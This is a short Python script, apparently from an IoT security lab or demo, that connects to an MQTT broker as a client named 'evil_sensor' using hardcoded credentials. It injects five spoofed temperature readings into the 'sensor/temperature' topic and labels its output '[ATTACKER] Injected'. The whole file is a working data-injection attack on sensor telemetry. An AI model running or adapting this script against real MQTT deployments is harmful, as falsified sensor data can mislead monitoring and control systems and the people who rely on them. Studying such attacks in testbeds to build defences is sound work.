import time
import paho.mqtt.client as mqtt

BROKER = 'broker'
PORT = 1883
TOPIC = 'sensor/temperature'

client = mqtt.Client(client_id='evil_sensor')  
client.username_pw_set('sensor', 'password')  

client.connect(BROKER, PORT, 60)
client.loop_start()

for i in range(5):
	fake_temp = f"999.99 FAKE {i}"
	client.publish(TOPIC, fake_temp)
	print(f"[ATTACKER] Injected: {fake_temp}")
	time.sleep(2)

client.loop_stop()
client.disconnect()
